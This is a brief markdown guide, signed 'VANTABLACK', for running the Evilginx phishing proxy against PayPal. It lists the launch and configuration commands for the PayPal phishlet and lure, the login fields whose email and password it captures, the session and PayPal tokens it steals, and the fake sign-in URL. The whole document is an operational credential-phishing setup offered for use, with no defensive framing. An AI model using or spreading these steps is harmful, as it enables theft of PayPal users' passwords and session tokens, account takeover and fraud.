# Evilginx Guide for PayPal

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable paypal
landers create paypal
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Email | `login_email` |
| Password | `login_password` |

## Tokens Captured

- `navcmd` - Navigation command
- `sess` - Session token
- `pnt` - PayPal token

## Login URL

```
https://your-domain.com/paypal/signin
```

---

**VANTABLACK**
